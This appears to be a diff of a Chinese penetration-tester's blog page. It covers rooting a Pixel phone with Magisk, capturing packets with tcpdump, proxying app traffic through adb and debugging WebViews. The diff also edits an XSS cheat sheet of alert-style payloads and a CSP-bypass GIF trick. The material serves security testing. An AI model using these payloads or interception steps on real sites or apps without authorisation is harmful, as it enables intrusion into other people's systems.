@@ -69,15 +69,16 @@
 <h2 id="简要："><a href="#简要：" class="headerlink" title="简要："></a>简要：</h2><h3 id="解锁-Bootloader"><a href="#解锁-Bootloader" class="headerlink" title="解锁 Bootloader"></a>解锁 Bootloader</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 重启手机 进入 bootloader 模式</span><br><span class="line">adb reboot bootloader</span><br><span class="line"></span><br><span class="line"># 进入 bootloader 模式之后</span><br><span class="line">fastboot flashing unlock</span><br><span class="line"></span><br><span class="line"># 没有重启就自己重启</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>
 
 <h3 id="下载线刷出厂映像"><a href="#下载线刷出厂映像" class="headerlink" title="下载线刷出厂映像"></a>下载线刷出厂映像</h3><p><a href="https://developers.google.com/android/images?hl=zh-cn">pixel出厂映像（注意版本号对应！）</a></p>
+<p><strong>#如果有代理可以选择flash进行线上刷机#</strong></p>
 <p>下载后：</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 进入到解压的文件夹中</span><br><span class="line"></span><br><span class="line"># 重启手机 进入 bootloader 模式</span><br><span class="line">adb reboot bootloader</span><br><span class="line"></span><br><span class="line"># mac 电脑 执行刷入</span><br><span class="line">./flash-all.sh </span><br><span class="line"></span><br><span class="line"># windows 电脑</span><br><span class="line">flash-all.bat</span><br></pre></td></tr></table></figure>
 
-<h3 id="安装-Magic-软件并打补丁"><a href="#安装-Magic-软件并打补丁" class="headerlink" title="安装 Magic 软件并打补丁"></a>安装 Magic 软件并打补丁</h3><p><a href="https://github.com/topjohnwu/Magisk/releases"><code>Magisk</code> <code>GitHub</code>下载地址(用于root或者其他组件)</a></p>
-<p>安装好后点击「安装 → 选择并修补一个文件」选择对应的<code>init_boot.img</code>安装（正常来说出厂映像就有对应的，没有就采用下面的第二个方法）</p>
+<h3 id="安装-Magisk-软件并打补丁"><a href="#安装-Magisk-软件并打补丁" class="headerlink" title="安装 Magisk 软件并打补丁"></a>安装 Magisk 软件并打补丁</h3><p><a href="https://github.com/topjohnwu/Magisk/releases"><code>Magisk</code> <code>GitHub</code>下载地址(用于root或者其他组件)</a></p>
+<p>安装好后点击「安装 → 选择并修补一个文件」选择对应的<code>init_boot.img</code>安装（正常来说出厂映像就有对应的init_boot.img，也可以采用下面的第二个方法，这是别人用magisk编译好的，注意编译版本）</p>
 <p><a href="https://github.com/anaelle-dev/P7P_Magisk_init_boot">获取 <code>init_boot.img</code> 的第二个方法（注意版本号对应！）</a></p>
 <p>选择刚刚的 <code>init_boot.img</code></p>
 <p>打完补丁后，会生成一个 <code>magisk_patched-xxx.img</code></p>
-<p>拖出来然后用电脑执行：</p>
+<p>adb pull拖出来然后用电脑执行：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot flash init_boot magisk_patched-xxx.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure>
 
 <p>检查是否可以赋予root权限：</p>
@@ -174,6 +175,10 @@
 <p><strong>抓取所有包并保存到 &#x2F;sdcard&#x2F;xxx</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i any -s 0 -w /sdcard/test.pcap</span><br><span class="line"><span class="comment">#建议加时间戳：</span></span><br><span class="line">tcpdump -i any -s 0 -w /sdcard/tcpdump_$(<span class="built_in">date</span> +%Y%m%d_%H%M%S).pcap</span><br><span class="line"><span class="comment">#抓取特定端口并保存：</span></span><br><span class="line">tcpdump -i any port 58384 -s 0 -w /sdcard/58384.pcap</span><br></pre></td></tr></table></figure>
 
+<h2 id="adb代理"><a href="#adb代理" class="headerlink" title="adb代理"></a>adb代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置全局代理</span><br><span class="line">adb shell settings put global http_proxy 127.0.0.1:8080</span><br><span class="line">#开启端口映射</span><br><span class="line">adb reverse tcp:8080 tcp:8080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#取消代理</span><br><span class="line">adb shell settings put global http_proxy :0</span><br><span class="line">#取消映射</span><br><span class="line">adb reverse --remove-all</span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="4-测试方法"><a href="#4-测试方法" class="headerlink" title="4-测试方法"></a>4-测试方法</h1><p>1.找到app的密钥和服务器证书和客户端证书，向外联ip直接测试【困难】</p>
 <p>​	如果能够获取到App内部的密钥和证书，那么我们可以模拟客户端直接与服务器进行TLCP通信。但这通常需要逆向工程来提取这些材料，而且如果App做了保护，可能比较困难。另外，如果通信过程中有客户端证书认证，那么我们需要同时获取客户端证书和私钥。如果成功，这种方法可以直接模拟客户端与服务器通信，进行自动化测试。</p>
 <p>2.frida找到发包的网络库hook，然后测试【容易】</p>
@@ -185,7 +190,7 @@
 <p><img src="/../image/app-Debug/phone-debug.png"></p>
 <p>2&gt;打开电脑Google的chrome:&#x2F;&#x2F;inspect&#x2F;#devices</p>
 <p><img src="/../image/app-Debug/Google-Debug.png"></p>
-<p>3&gt;打开手机app的调试开关中的xweb或者其他webview、TBS X5等</p>
+<p>3&gt;打开手机app的调试开关中的xweb或者其他webview、TBS X5等，<strong>最重要的是打开webview调试</strong></p>
 <p><img src="/../image/app-Debug/app-debug-1.png"></p>
 <p><img src="/../image/app-Debug/app-debug-2.png"></p>
 <p>4&gt;点击Google中弹出的</p>
@@ -3585,9 +3590,9 @@
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>; alert<span class="string">`1`</span>; <span class="comment">//&quot;;</span></span><br><span class="line"><span class="number">0</span>||alert%0D<span class="string">`1`</span><span class="comment">//</span></span><br><span class="line">%0a<span class="string">`<span class="subst">$&#123;alert%0D(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">onload=alert<span class="string">`1`</span> <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">\u0022\u003b+alert\u00601\u0060\u003b+<span class="comment">//</span></span><br></pre></td></tr></table></figure>
 
 <hr>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#normal</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">#img</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">#svg</span><br><span class="line">&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">    </span><br><span class="line">#标签</span><br><span class="line">&lt;aaaa id=&quot;c&quot; onfocus=&quot;alert(1)&quot; tabindex=0&gt;</span><br><span class="line">        </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#base64加密</span><br><span class="line">    </span><br><span class="line">    &lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#normal</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">#img</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">#svg</span><br><span class="line">&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">    </span><br><span class="line">#标签</span><br><span class="line">&lt;aaaa id=&quot;c&quot; onfocus=&quot;alert(1)&quot; tabindex=0&gt;</span><br><span class="line">        </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#鼠标移动</span><br><span class="line">&lt;a onmousemove=\&quot;alert(1)\&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">#base64加密</span><br><span class="line">    </span><br><span class="line">    &quot;&lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;&quot;</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
 
-<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://116.205.161.165/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
 <p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
